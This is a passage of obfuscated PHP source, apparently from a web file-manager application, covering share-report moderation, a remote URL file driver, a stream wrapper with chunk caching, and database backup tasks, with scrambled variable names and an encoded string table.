$²÷•ÅöÄ[2078]); } if ($îéõ’İ[$²÷•ÅöÄ[2074]]) { $îÄ¹¢¢¹[] = array($²÷•ÅöÄ[2122] => $îéõ’İ[$²÷•ÅöÄ[2074]], $²÷•ÅöÄ[1666] => array($²÷•ÅöÄ[459], "\x25{$îéõ’İ[$²÷•ÅöÄ[2074]]}\45"), $²÷•ÅöÄ[2125] => $²÷•ÅöÄ[2078]); } $Èœª»Ÿú = $this->_makeOrder()->where($îÄ¹¢¢¹)->selectPage(20); if (empty($Èœª»Ÿú[$²÷•ÅöÄ[445]])) { return array(); } $this->_listDataApply($Èœª»Ÿú[$²÷•ÅöÄ[445]]); return $Èœª»Ÿú; } public function listDataApply($œÎ‹âÙç) { $this->_listDataApply($œÎ‹âÙç); return $œÎ‹âÙç; } private function _listDataApply(&$€¯‹³ƒÜ) { $ŞÄªô´‹ =& $_SERVER[¿ğÚ‰±–]; $ºøšõ¹ñ = array_to_keyvalue($€¯‹³ƒÜ, $ŞÄªô´‹[12], $ŞÄªô´‹[1777]); $†Àª±©û = Model($ŞÄªô´‹[598])->userListInfo(array_unique($ºøšõ¹ñ)); $·ºòìÒ = array_to_keyvalue($€¯‹³ƒÜ, $ŞÄªô´‹[12], $ŞÄªô´‹[193]); $ºïñŠ¹Ô = Model($ŞÄªô´‹[902])->sourceListInfo($·ºòìÒ, !0); foreach ($€¯‹³ƒÜ as $ª¿ØÅª => &$¦ÇÃÙÌ¡) { $áöª²ƒæ = $¦ÇÃÙÌ¡[$ŞÄªô´‹[1777]]; $¦ÇÃÙÌ¡[$ŞÄªô´‹[2152]] = $†Àª±©û[$áöª²ƒæ] ? $†Àª±©û[$áöª²ƒæ] : !1; $œÛÉ¢—ã = $¦ÇÃÙÌ¡[$ŞÄªô´‹[193]]; $¦ÇÃÙÌ¡[$ŞÄªô´‹[90]] = $ºïñŠ¹Ô[$œÛÉ¢—ã] ? $ºïñŠ¹Ô[$œÛÉ¢—ã] : !1; if ($¦ÇÃÙÌ¡[$ŞÄªô´‹[90]][$ŞÄªô´‹[505]] == $ŞÄªô´‹[91]) { unset($€¯‹³ƒÜ[$ª¿ØÅª]); } if ($¦ÇÃÙÌ¡[$ŞÄªô´‹[90]] != $ŞÄªô´‹[228] && !$¦ÇÃÙÌ¡[$ŞÄªô´‹[90]]) { unset($€¯‹³ƒÜ[$ª¿ØÅª]); } } unset($¦ÇÃÙÌ¡); $€¯‹³ƒÜ = array_values($€¯‹³ƒÜ); } private function _makeOrder($ËÛåÊÂİ = '') { $èóŞ¼ôÊ =& $_SERVER[¿ğÚ‰±–]; $¨²Øª©Å = array($èóŞ¼ôÊ[231], $èóŞ¼ôÊ[839], $èóŞ¼ôÊ[2139], $èóŞ¼ôÊ[2140]); $£¬ÊôàÌ = array($èóŞ¼ôÊ[523] => $èóŞ¼ôÊ[524], $èóŞ¼ôÊ[525] => $èóŞ¼ôÊ[526]); $åÃ—¹îÊ = Input::get($èóŞ¼ôÊ[530], $èóŞ¼ôÊ[7], $èóŞ¼ôÊ[497], $¨²Øª©Å); $úĞè°…ò = Input::get($èóŞ¼ôÊ[531], $èóŞ¼ôÊ[7], $èóŞ¼ôÊ[2153], array($èóŞ¼ôÊ[2071], $èóŞ¼ôÊ[525])); $úĞè°…ò = $£¬ÊôàÌ[$úĞè°…ò]; $ËÛåÊÂİ = $ËÛåÊÂİ . "{$åÃ—¹îÊ}\40{$úĞè°…ò}"; return $this->order($ËÛåÊÂİ); } public function reportAdd($©¿´¸…¨) { $ä‹äô™Â =& $_SERVER[¿ğÚ‰±–]; $’Ä§áã = array($ä‹äô™Â[665] => $©¿´¸…¨[$ä‹äô™Â[665]], $ä‹äô™Â[1777] => USER_ID); if (Model($ä‹äô™Â[2149])->where($’Ä§áã)->find()) { return !1; } $Ã­Èó‘ = array($ä‹äô™Â[665] => $©¿´¸…¨[$ä‹äô™Â[665]], $ä‹äô™Â[1666] => $©¿´¸…¨[$ä‹äô™Â[1666]], $ä‹äô™Â[193] => $©¿´¸…¨[$ä‹äô™Â[193]], $ä‹äô™Â[541] => $©¿´¸…¨[$ä‹äô™Â[541]], $ä‹äô™Â[1777] => USER_ID, $ä‹äô™Â[33] => $©¿´¸…¨[$ä‹äô™Â[33]], $ä‹äô™Â[526] => $©¿´¸…¨[$ä‹äô™Â[526]]); return Model($ä‹äô™Â[2149])->add($Ã­Èó‘); } public function reportList($Ã¸œ¸‰) { $À­Ÿü =& $_SERVER[¿ğÚ‰±–]; $÷‘Èä­ = array(); if ($Ã¸œ¸‰[$À­Ÿü[838]]) { $¹’óßŒŸ = $Ã¸œ¸‰[$À­Ÿü[839]] ? $Ã¸œ¸‰[$À­Ÿü[839]] : strtotime(date($À­Ÿü[2151])); $÷‘Èä­[$À­Ÿü[231]] = array($À­Ÿü[409], array($Ã¸œ¸‰[$À­Ÿü[838]], $¹’óßŒŸ)); } if (isset($Ã¸œ¸‰[$À­Ÿü[33]]) && in_array($Ã¸œ¸‰[$À­Ÿü[33]], array($À­Ÿü[91], $À­Ÿü[510], $À­Ÿü[2154], $À­Ÿü[2155], $À­Ÿü[2156]))) { $÷‘Èä­[$À­Ÿü[33]] = $Ã¸œ¸‰[$À­Ÿü[33]]; } if (isset($Ã¸œ¸‰[$À­Ÿü[828]]) && in_array($Ã¸œ¸‰[$À­Ÿü[828]], array($À­Ÿü[228], $À­Ÿü[91], $À­Ÿü[510], $À­Ÿü[2154]))) { $÷‘Èä­[$À­Ÿü[828]] = $Ã¸œ¸‰[$À­Ÿü[828]]; } $ÛöÈ—ãí = Input::get($À­Ÿü[531], $À­Ÿü[7], $À­Ÿü[2153], array($À­Ÿü[2071], $À­Ÿü[525])); $¡Á”šè¿ = array($À­Ÿü[523] => $À­Ÿü[524], $À­Ÿü[525] => $À­Ÿü[526]); $”¯Ñ­ùŒ = $À­Ÿü[2157] . $¡Á”šè¿[$ÛöÈ—ãí]; $šƒšûåÓ = Model($À­Ÿü[2149])->where($÷‘Èä­)->order($”¯Ñ­ùŒ)->selectPage(20); if (empty($šƒšûåÓ[$À­Ÿü[445]])) { return array(); } $§¾é›Ññ = array_to_keyvalue_group($šƒšûåÓ[$À­Ÿü[445]], $À­Ÿü[828], $À­Ÿü[665]); if (!empty($§¾é›Ññ[0])) { $Ã¸œ¸‰ = $§¾é›Ññ[0]; $÷‘Èä­ = array($À­Ÿü[665] => array($À­Ÿü[7], $Ã¸œ¸‰)); $ü€©Ê¿ = $this->where($÷‘Èä­)->field($À­Ÿü[665])->select(); $ü€©Ê¿ = array_to_keyvalue($ü€©Ê¿, $À­Ÿü[12], $À­Ÿü[665]); $¨›¼Ø˜± = array_diff($Ã¸œ¸‰, $ü€©Ê¿); if (!empty($¨›¼Ø˜±)) { foreach ($šƒšûåÓ[$À­Ÿü[445]] as $×îê‰¢” => $õ‰ˆÇƒ˜) { if (in_array($õ‰ˆÇƒ˜[$À­Ÿü[665]], $¨›¼Ø˜±)) { unset($šƒšûåÓ[$À­Ÿü[445]][$×îê‰¢”]); } } } } $this->_listDataApply($šƒšûåÓ[$À­Ÿü[445]]); return $šƒšûåÓ; } public function reportStatus($“è­çÄá) { $Îï…è²Ş =& $_SERVER[¿ğÚ‰±–]; $ø•‡èÙİ = array($Îï…è²Ş[475] => $“è­çÄá[$Îï…è²Ş[475]]); $şù—‡ë = Model($Îï…è²Ş[2149])->where($ø•‡èÙİ)->field($Îï…è²Ş[2158])->find(); if (!$şù—‡ë) { return !1; } $ªÑ”„î¸ = array($Îï…è²Ş[828] => $“è­çÄá[$Îï…è²Ş[828]]); if ($“è­çÄá[$Îï…è²Ş[828]] == $Îï…è²Ş[2154] && $şù—‡ë[$Îï…è²Ş[828]] == $Îï…è²Ş[2154]) { $ªÑ”„î¸[$Îï…è²Ş[828]] = 0; } $â“Şøè× = Model($Îï…è²Ş[2149])->where($ø•‡èÙİ)->save($ªÑ”„î¸); if ($“è­çÄá[$Îï…è²Ş[828]] == $Îï…è²Ş[510]) { if ($şù—‡ë[$Îï…è²Ş[541]] != $Îï…è²Ş[228] && $this->shareFileMeta($şù—‡ë[$Îï…è²Ş[541]])) { $this->shareFileMeta($şù—‡ë[$Îï…è²Ş[541]], 0); } $this->remove($şù—‡ë[$Îï…è²Ş[665]]); return !0; } if ($â“Şøè× && $“è­çÄá[$Îï…è²Ş[828]] == $Îï…è²Ş[2154]) { $¸ÛÔ×Ãé = $ªÑ”„î¸[$Îï…è²Ş[828]] == $Îï…è²Ş[2154] ? 1 : 0; $this->shareFileMeta($şù—‡ë[$Îï…è²Ş[541]], $¸ÛÔ×Ãé); $this->removeByFile($şù—‡ë[$Îï…è²Ş[541]]); } return $â“Şøè×; } private function removeByFile($Ô„­şŸ) { $ëŸÆÒ¬® =& $_SERVER[¿ğÚ‰±–]; $¢İ´–ÏÊ = Model($ëŸÆÒ¬®[902])->where(array($ëŸÆÒ¬®[541] => $Ô„­şŸ))->field($ëŸÆÒ¬®[193])->select(); $é¸«¤ßï = array_to_keyvalue($¢İ´–ÏÊ, $ëŸÆÒ¬®[12], $ëŸÆÒ¬®[193]); $ì èš…¢ = array($ëŸÆÒ¬®[193] => array($ëŸÆÒ¬®[7], $é¸«¤ßï), $ëŸÆÒ¬®[562] => 1); $¢İ´–ÏÊ = $this->where($ì èš…¢)->field($ëŸÆÒ¬®[665])->select(); if (empty($¢İ´–ÏÊ)) { return; } $¡ù—æ‰Í = array_to_keyvalue($¢İ´–ÏÊ, $ëŸÆÒ¬®[12], $ëŸÆÒ¬®[665]); $this->remove($¡ù—æ‰Í); } private function shareFileMeta($ı›œ¶à, $¬àÇš©ƒ = null) { $óè©×ˆÜ =& $_SERVER[¿ğÚ‰±–]; $Ìå»Ö®à = array($óè©×ˆÜ[541] => $ı›œ¶à, $óè©×ˆÜ[97] => $óè©×ˆÜ[2159]); if (is_null($¬àÇš©ƒ)) { return Model($óè©×ˆÜ[2160])->where($Ìå»Ö®à)->find(); } $Ìå»Ö®à[$óè©×ˆÜ[450]] = $¬àÇš©ƒ; Model($óè©×ˆÜ[2160])->add($Ìå»Ö®à, array(), !0); } } goto Bå£Õöˆ²õ; Cõ†É®¿³‹: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($‹ï°êš¾ = false) { } public function exist($ğ¡´¥ä) { $ÖèŠ°± = $this->info($ğ¡´¥ä); return $ÖèŠ°±[$_SERVER[¿ğÚ‰±–][232]]; } public function isFile($´ãşŸ·Ú) { $ı˜ÎÒ±’ = $this->info($´ãşŸ·Ú); return $ı˜ÎÒ±’[$_SERVER[¿ğÚ‰±–][232]]; } public function isFolder($…‹´½×ñ) { return !1; } public function size($ÛÖ¾¢é) { $··§Ã‘¤ = $this->info($ÛÖ¾¢é); return $··§Ã‘¤[$_SERVER[¿ğÚ‰±–][79]]; } public function info($“ô“øù£) { return $this->infoParse($“ô“øù£); } public function infoAuth($Ï´Â¤Ôá) { return $this->infoParse($Ï´Â¤Ôá); } public function infoWithChildren($ßßÚµâ) { return $this->infoParse($ßßÚµâ); } public function infoFull($¨•×ü½«) { return $this->infoParse($¨•×ü½«); } private function infoParse($¶¦À¹Ôá) { $æ‰µÈé =& $_SERVER[¿ğÚ‰±–]; $°®Ó²ô = $this->header($¶¦À¹Ôá); if (!$°®Ó²ô || !$°®Ó²ô[$æ‰µÈé[828]]) { return !1; } $úÌ¿á¦ = _get($°®Ó²ô, $æ‰µÈé[413], 0); $âßßİã = array($æ‰µÈé[32] => $°®Ó²ô[$æ‰µÈé[32]], $æ‰µÈé[87] => $¶¦À¹Ôá, $æ‰µÈé[33] => $æ‰µÈé[230], $æ‰µÈé[79] => intval($úÌ¿á¦), $æ‰µÈé[169] => get_path_ext($°®Ó²ô[$æ‰µÈé[32]]), $æ‰µÈé[1460] => $úÌ¿á¦ > 0 && $°®Ó²ô[$æ‰µÈé[1611]], $æ‰µÈé[1461] => !1); return $âßßİã; } private function header($äÏ…Ò†â) { $¿Íªë¨ =& $_SERVER[¿ğÚ‰±–]; if (isset(self::$_cacheHeader[$äÏ…Ò†â])) { return self::$_cacheHeader[$äÏ…Ò†â]; } $Üí“„Ïä = isset($GLOBALS[$¿Íªë¨[1612]]) ? $GLOBALS[$¿Íªë¨[1612]] : !1; $GLOBALS[$¿Íªë¨[1612]] = !0; self::$_cacheHeader[$äÏ…Ò†â] = url_header($äÏ…Ò†â); $GLOBALS[$¿Íªë¨[1612]] = $Üí“„Ïä; return self::$_cacheHeader[$äÏ…Ò†â]; } public function hashSimple($Ÿ”©å—ï, $§ë²çç± = false) { $ÖíÚœø‹ =& $_SERVER[¿ğÚ‰±–]; $ÆÓ…ô†£ = $this->info($Ÿ”©å—ï); if (!$ÆÓ…ô†£ || !$ÆÓ…ô†£[$ÖíÚœø‹[232]]) { return !1; } $àºÇÊà‘ = $ÆÓ…ô†£[$ÖíÚœø‹[79]]; $ÙÈÌÛ = 200; $¤œ³Æáù = 50; if ($àºÇÊà‘ <= $ÙÈÌÛ * $¤œ³Æáù) { return md5($this->fileSubstr($Ÿ”©å—ï, 0, $àºÇÊà‘)) . $àºÇÊà‘; } $ŞŠÙ“Ëî = intval($àºÇÊà‘ / $¤œ³Æáù); $×®¥àĞÏ = $ÖíÚœø‹[12]; $áê°•ü = timeFloat(); $Ô¶é£ôï = 15; for ($áà˜àú = 0; $áà˜àú < $¤œ³Æáù; $áà˜àú++) { if (timeFloat() - $áê°•ü > $Ô¶é£ôï) { return !1; } $ú¿â“µ = $this->fileSubstr($Ÿ”©å—ï, $ŞŠÙ“Ëî * $áà˜àú, $ÙÈÌÛ); if (!$ú¿â“µ) { return !1; } $×®¥àĞÏ .= $ú¿â“µ; } $×®¥àĞÏ .= $this->fileSubstr($Ÿ”©å—ï, $àºÇÊà‘ - $ÙÈÌÛ, $ÙÈÌÛ); return md5($×®¥àĞÏ) . $àºÇÊà‘; } public function getContent($ÓêƒÌ) { return $this->fileSubstr($ÓêƒÌ); } public function fileSubstr($ÇÏ²ÇÈ·, $ÑÌŠ™¥ = 0, $° º‰¦ = -1) { $ğÍ½ëÙº =& $_SERVER[¿ğÚ‰±–]; $³óà¥úÚ = $this->info($ÇÏ²ÇÈ·); if (!$³óà¥úÚ || !$³óà¥úÚ[$ğÍ½ëÙº[232]] && $³óà¥úÚ[$ğÍ½ëÙº[79]] > 1024 * 1024 * 10) { return !1; } if ($° º‰¦ === -1) { $° º‰¦ = $³óà¥úÚ[$ğÍ½ëÙº[79]]; } if ($° º‰¦ == 0) { return $ğÍ½ëÙº[12]; } $ØÃÂ›ÙÒ = array($ğÍ½ëÙº[1613] . $ÑÌŠ™¥ . $ğÍ½ëÙº[863] . ($ÑÌŠ™¥ + $° º‰¦ - 1)); $ìï´šŸ = url_request($ÇÏ²ÇÈ·, $ğÍ½ëÙº[261], !1, $ØÃÂ›ÙÒ, !1, !1, 30); return $ìï´šŸ[$ğÍ½ëÙº[1294]] ? $ìï´šŸ[$ğÍ½ëÙº[1294]] : $ğÍ½ëÙº[12]; } public function download($Ÿãä—ó¡, $ØÚ€ßïÀ) { Downloader::start($Ÿãä—ó¡, $ØÚ€ßïÀ); return $ØÚ€ßïÀ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($‰õÅ¯¨, $²¯ÈŠÙí = '') { $this->info = $this->info($‰õÅ¯¨); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¿ğÚ‰±–][87]]; $this->pathOpen = $‰õÅ¯¨; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$‰õÅ¯¨])) { self::$_chunkBuffer[$‰õÅ¯¨] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($¢ïË³•Š) { $ÛèÑ£õ‹ = $this->fileSubstr($this->pose, $¢ïË³•Š); $this->pose += strlen($ÛèÑ£õ‹); return $ÛèÑ£õ‹; } public function stream_tell() { return $this->pose; } public function stream_seek($¸ öÇ³, $º˜Ï‚ı”) { $ öû÷Ë– =& $_SERVER[¿ğÚ‰±–]; if ($º˜Ï‚ı” == SEEK_SET) { $this->pose = $¸ öÇ³; } else { if ($º˜Ï‚ı” == SEEK_CUR) { $this->pose += $¸ öÇ³; } else { if ($º˜Ï‚ı” == SEEK_END) { $this->pose = $this->info[$ öû÷Ë–[79]] + intval($¸ öÇ³); } } } if ($¸ öÇ³ < 0) { $this->pose = $this->info[$ öû÷Ë–[79]] + $¸ öÇ³; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¿ğÚ‰±–][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($¤¯’Û²ä, $µ‹İèÕî) { $Š±ò¬˜Ó =& $_SERVER[¿ğÚ‰±–]; $”éŸšÕ® = $this->info($¤¯’Û²ä); return array($Š±ò¬˜Ó[1614] => 0, $Š±ò¬˜Ó[1615] => 0, $Š±ò¬˜Ó[16] => 32768 + 511, $Š±ò¬˜Ó[1616] => 0, $Š±ò¬˜Ó[1617] => 0, $Š±ò¬˜Ó[1618] => 0, $Š±ò¬˜Ó[1619] => 0, $Š±ò¬˜Ó[79] => $”éŸšÕ®[$Š±ò¬˜Ó[79]], $Š±ò¬˜Ó[1620] => $”éŸšÕ®[$Š±ò¬˜Ó[1459]], $Š±ò¬˜Ó[1575] => $”éŸšÕ®[$Š±ò¬˜Ó[88]], $Š±ò¬˜Ó[1574] => $”éŸšÕ®[$Š±ò¬˜Ó[231]], $Š±ò¬˜Ó[1621] => 0, $Š±ò¬˜Ó[1622] => 0); } static $fileInfo = array(); public function info($Û¿æ½«…) { $âÔœ‰ó™ = $_SERVER[¿ğÚ‰±–][1623]; if (isset(self::$fileInfo[$Û¿æ½«…])) { return self::$fileInfo[$Û¿æ½«…]; } if (substr($Û¿æ½«…, 0, strlen($âÔœ‰ó™)) != $âÔœ‰ó™) { return !1; } self::$fileInfo[$Û¿æ½«…] = IO::info(substr($Û¿æ½«…, strlen($âÔœ‰ó™))); return self::$fileInfo[$Û¿æ½«…]; } public static function read($··–²¸, $î·Ùù», $çİã¹‰³) { if (!isset(self::$_fopenCache[$··–²¸])) { $ë‚é™ÀĞ = new StreamWrapperIO(); $ë‚é™ÀĞ->stream_open($··–²¸); self::$_fopenCache[$··–²¸] = $ë‚é™ÀĞ; } $ë‚é™ÀĞ = self::$_fopenCache[$··–²¸]; return $ë‚é™ÀĞ->fileSubstr($î·Ùù», $çİã¹‰³); } public static function _read($áÓ‚»¾‘, $··ÄäÁü, $±˜ˆ“å ) { $‡æÓÀÅ =& $_SERVER[¿ğÚ‰±–]; $ë¬ı §ğ = fopen($áÓ‚»¾‘, $‡æÓÀÅ[1463]); if (!$ë¬ı §ğ) { return $‡æÓÀÅ[12]; } $Êæôè…ø = 8192; fseek($ë¬ı §ğ, $··ÄäÁü, SEEK_SET); $Ãù÷˜óğ = $‡æÓÀÅ[12]; $­îµ´£¡ = 0; while ($­îµ´£¡ < $±˜ˆ“å ) { $ö±¨ÅÌ¡ = min($Êæôè…ø, $±˜ˆ“å  - $­îµ´£¡); $Ãù÷˜óğ .= fread($ë¬ı §ğ, $ö±¨ÅÌ¡); $­îµ´£¡ += $ö±¨ÅÌ¡; } fclose($ë¬ı §ğ); return $Ãù÷˜óğ; } public function fileSubstr($ù±®åê, $ ·éµÎì) { $©–™ğş£ =& $_SERVER[¿ğÚ‰±–]; $ÒÙòŠå = $this->info[$©–™ğş£[79]]; $«º‘é = $ù±®åê; $ºÕà…âÙ = $ ·éµÎì; if ($ù±®åê < 0) { $ù±®åê = $ÒÙòŠå + $ù±®åê; } if ($ ·éµÎì === !1) { $ ·éµÎì = $ÒÙòŠå - $ù±®åê; } if ($ù±®åê + $ ·éµÎì > $ÒÙòŠå) { $ ·éµÎì = $ÒÙòŠå - $ù±®åê; } if ($ ·éµÎì <= 0) { return $©–™ğş£[12]; } if ($ù±®åê < 0 || $ù±®åê >= $ÒÙòŠå || $ ·éµÎì <= 0 || $ ·éµÎì > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\x69\154\x65\x52\145\141\x64\x20\x65\x72\162\x6f\x72\41\x20\163\164\141\162\x74\x3d{$ù±®åê}\73\154\145\156\147\164\x68\75{$ ·éµÎì}\x3b\40\x73\x69\172\145\75{$ÒÙòŠå}\73"); } $ğ‰òı¯ = 64 * 1024; $¤¨Õá‚Ô =& self::$_chunkBuffer[$this->path]; if (!$¤¨Õá‚Ô) { $¤¨Õá‚Ô = array(); } $ß¾ıÌêº = 0; $ğë¸ÚÒù = 0; $Ñ§úºòí = $©–™ğş£[12]; foreach ($¤¨Õá‚Ô as $ß¾ıÌêº => $Ñ§úºòí) { $ß¾ıÌêº = intval($ß¾ıÌêº); $ğë¸ÚÒù = $ß¾ıÌêº + strlen($Ñ§úºòí); if ($ù±®åê >= $ğë¸ÚÒù) { continue; } if ($ù±®åê >= $ß¾ıÌêº && $ù±®åê + $ ·éµÎì <= $ğë¸ÚÒù) { return substr($Ñ§úºòí, $ù±®åê - $ß¾ıÌêº, $ ·éµÎì); } break; } if (count($¤¨Õá‚Ô) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($©–™ğş£[1624], $©–™ğş£[1625] . count($¤¨Õá‚Ô) . "\x3b\163\164\141\x72\164\75{$ù±®åê}\54\x6c\145\156\x67\164\150\x3d{$ ·éµÎì}\73\x70\x6f\163\x65\x3a{$ß¾ıÌêº}\176{$ğë¸ÚÒù}"); throw new Exception($©–™ğş£[1626]); } $Ş¯Ó÷¹Ë = intval($ù±®åê / $ğ‰òı¯) * $ğ‰òı¯; $´Ï½øêõ = ceil(($ù±®åê + $ ·éµÎì) / $ğ‰òı¯) * $ğ‰òı¯ - $Ş¯Ó÷¹Ë; $ÀÜ±Çö¹ = IO::fileSubstr($this->path, $Ş¯Ó÷¹Ë, $´Ï½øêõ); $¤¨Õá‚Ô[$Ş¯Ó÷¹Ë . $©–™ğş£[12]] = $ÀÜ±Çö¹; ksort($¤¨Õá‚Ô); $ÄÔƒåª = substr($ÀÜ±Çö¹, $ù±®åê - $Ş¯Ó÷¹Ë, $ ·éµÎì); return $ÄÔƒåª; } private function log($áËåïãà, $±¤àöÁ§) { $©íÓ¾åŠ =& $_SERVER[¿ğÚ‰±–]; $˜ç°ï‘ô = timeFloat() - $this->timeStart; write_log(sprintf($©íÓ¾åŠ[1627], $áËåïãà, $this->info[$©íÓ¾åŠ[32]], $˜ç°ï‘ô, $±¤àöÁ§), $©íÓ¾åŠ[1271]); } } class Message { function __construct() { } public function send($©¿ˆèü• = '', $İí¡Ìı = array(), $¢ıøüæ = "\x74\x65\170\x74") { $Ö­•¬¨ú =& $_SERVER[¿ğÚ‰±–]; $ïÛ‡£÷  = array($Ö­•¬¨ú[33] => $Ö­•¬¨ú[1628], $Ö­•¬¨ú[171] => $©¿ˆèü•); if (in_array($¢ıøüæ, array($Ö­•¬¨ú[1628], $Ö­•¬¨ú[1629]))) { $ïÛ‡£÷ [$Ö­•¬¨ú[33]] = $¢ıøüæ; } $İí¡Ìı = array($Ö­•¬¨ú[578] => isset($İí¡Ìı[$Ö­•¬¨ú[578]]) ? $İí¡Ìı[$Ö­•¬¨ú[578]] : $Ö­•¬¨ú[12], $Ö­•¬¨ú[662] => isset($İí¡Ìı[$Ö­•¬¨ú[662]]) ? $İí¡Ìı[$Ö­•¬¨ú[662]] : $Ö­•¬¨ú[12]); if (empty($©¿ˆèü•) || empty($İí¡Ìı[$Ö­•¬¨ú[578]]) && empty($İí¡Ìı[$Ö­•¬¨ú[662]])) { return !1; } $–ëû“… = array($Ö­•¬¨ú[1555] => $ïÛ‡£÷ , $Ö­•¬¨ú[1630] => $İí¡Ìı); Hook::trigger($Ö­•¬¨ú[1631], $–ëû“…); } } goto bæŠØ±†ï; AË›ù§Âá: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ƒÒæ¾ =& $_SERVER[¿ğÚ‰±–]; $õâæŞÅ = Backup::get(); self::$io = $õâæŞÅ[$ƒÒæ¾[830]]; self::$name = $õâæŞÅ[$ƒÒæ¾[32]]; $ªç¥Ş = new DbManage(); $¨ˆ×âßÍ = $ªç¥Ş->dbType(); $ÁÜÃÑÚØ = array($ƒÒæ¾[855] => $¨ˆ×âßÍ, $ƒÒæ¾[856] => time()); Backup::set($ÁÜÃÑÚØ); $ÑšÛš†é = $this->tmpFilesPath() . $ƒÒæ¾[857] . self::$name . $ƒÒæ¾[8]; del_dir($ÑšÛš†é); mk_dir($ÑšÛš†é); $Î‹ÜŞ—® = $ïØú§³Ô = 0; try { $‘à—Çõ¹ = $ªç¥Ş->db()->getTables(); } catch (Exception $ÖšøÅöò) { return !1; } $‘à—Çõ¹ = array_diff($‘à—Çõ¹, array($ƒÒæ¾[858], $ƒÒæ¾[859])); foreach ($‘à—Çõ¹ as $é…öƒ¼À) { $Î‹ÜŞ—® += $ªç¥Ş->model($é…öƒ¼À)->count(); } $©Ñ”êé = new Task($ƒÒæ¾[860], $ƒÒæ¾[861], $Î‹ÜŞ—®, LNG($ƒÒæ¾[862]) . $ƒÒæ¾[863] . LNG($ƒÒæ¾[864])); $GLOBALS[$ƒÒæ¾[865]] = self::$name; foreach ($‘à—Çõ¹ as $é…öƒ¼À) { $ËÊ¤¨¡– = $ÑšÛš†é . $é…öƒ¼À . $ƒÒæ¾[866]; $»ôÚÉÏ = null; if ($é…öƒ¼À == $ƒÒæ¾[867] && (!isset($õâæŞÅ[$ƒÒæ¾[171]]) || $õâæŞÅ[$ƒÒæ¾[171]] == $ƒÒæ¾[228])) { $»ôÚÉÏ = self::$io; } $ïØú§³Ô += $ªç¥Ş->sqlFromDb($é…öƒ¼À, $ËÊ¤¨¡–, $©Ñ”êé, $»ôÚÉÏ); } unset($GLOBALS[$ƒÒæ¾[865]]); $©Ñ”êé->end(); if ($ïØú§³Ô > $Î‹ÜŞ—®) { $Î‹ÜŞ—® = $ïØú§³Ô; } $ÁÜÃÑÚØ = array($ƒÒæ¾[855] => $¨ˆ×âßÍ, $ƒÒæ¾[851] => 1, $ƒÒæ¾[868] => $Î‹ÜŞ—®, $ƒÒæ¾[869] => $ïØú§³Ô, $ƒÒæ¾[870] => time()); Backup::set($ÁÜÃÑÚØ); if ($Î‹ÜŞ—® - $ïØú§³Ô > 0) { $“ëÄ§Û = $ƒÒæ¾[871]; if (!stristr(I18n::getType(), $ƒÒæ¾[872])) { $“ëÄ§Û = $ƒÒæ¾[873]; } write_log(array($“ëÄ§Û, $ÁÜÃÑÚØ), $ƒÒæ¾[861]); return !1; } return !0; } private function tmpFilesPath() { $åìşü±¢ =& $_SERVER[¿ğÚ‰±–]; $ë¿È³½Ò = TEMP_FILES; if ($GLOBALS[$åìşü±¢[6]][$åìşü±¢[92]][$åìşü±¢[874]]) { $ë¿È³½Ò = $GLOBALS[$åìşü±¢[6]][$åìşü±¢[92]][$åìşü±¢[874]]; if (!mk_dir($ë¿È³½Ò) || !is_writable($ë¿È³½Ò) || !IO::mkfile($ë¿È³½Ò . $åìşü±¢[875])) { $ë¿È³½Ò = TEMP_FILES; } } return $ë¿È³½Ò; } } class BackupDbFile { public function __construct() { } public function index() { $ÈïÎúÓø =& $_SERVER[¿ğÚ‰±–]; $—ƒÊèñî = Backup::get(); $óµ®’Ëš = $—ƒÊèñî[$ÈïÎúÓø[32]]; $çˆÄµå = $this->tmpFilesPath() . "\142\x61\143\153\165\160\137{$óµ®’Ëš}\x2f"; $ÛçÛôšø = $this->backupPath($—ƒÊèñî); if (!($ÛçÛôšø = IO::mkdir($ÛçÛôšø))) { return !1; } $õÚ§çß» = IO::listPath($çˆÄµå); $Û€ç·šÎ = isset($õÚ§çß»[$ÈïÎúÓø[86]]) ? $õÚ§çß»[$ÈïÎúÓø[86]] : array(); $»“—É¹à = array_sum(array_column($Û€ç·šÎ, $ÈïÎúÓø[79])); if (!$»“—É¹à) { return !1; } $£ê´‰˜¯ = array($ÈïÎúÓø[876] => $»“—É¹à, $ÈïÎúÓø[877] => time()); Backup::set($£ê´‰˜¯); $™ÔÔ¿ã = new TaskFileTransfer($ÈïÎúÓø[878], $ÈïÎúÓø[861], count($Û€ç·šÎ), LNG($ÈïÎúÓø[862]) . $ÈïÎúÓø[462] . LNG($ÈïÎúÓø[864]) . $ÈïÎúÓø[879]); $™ÔÔ¿ã->task[$ÈïÎúÓø[841]] = $»“—É¹à; foreach ($õÚ§çß»[$ÈïÎúÓø[86]] as $¶Â­ ¬¢) { $ÜéòÈ²µ = IO::move($¶Â­ ¬¢[$ÈïÎúÓø[87]], $ÛçÛôšø); if (!$ÜéòÈ²µ) { $™ÔÔ¿ã->end(); $€ìíÜ— = IO::getLastError($ÈïÎúÓø[880] . $¶Â­ ¬¢[$ÈïÎúÓø[87]] . $ÈïÎúÓø[881] . $ÛçÛôšø . $ÈïÎúÓø[178]); write_log($€ìíÜ—, $ÈïÎúÓø[861]); return !1; } } $®¨ù‚“® = new DbManage(); $úâ¾Ü¶Á = $®¨ù‚“®->getSqlFile(); if (!$úâ¾Ü¶Á[$ÈïÎúÓø[882]] || !$úâ¾Ü¶Á[$ÈïÎúÓø[13]]) { return !1; } IO::move($úâ¾Ü¶Á[$ÈïÎúÓø[882]], $ÛçÛôšø); IO::move($úâ¾Ü¶Á[$ÈïÎúÓø[13]], $ÛçÛôšø); $™ÔÔ¿ã->end(); $£ê´‰˜¯ = array($ÈïÎúÓø[883] => $»“—É¹à, $ÈïÎúÓø[884] => time()); Backup::set($£ê´‰˜¯); return !0; } private function 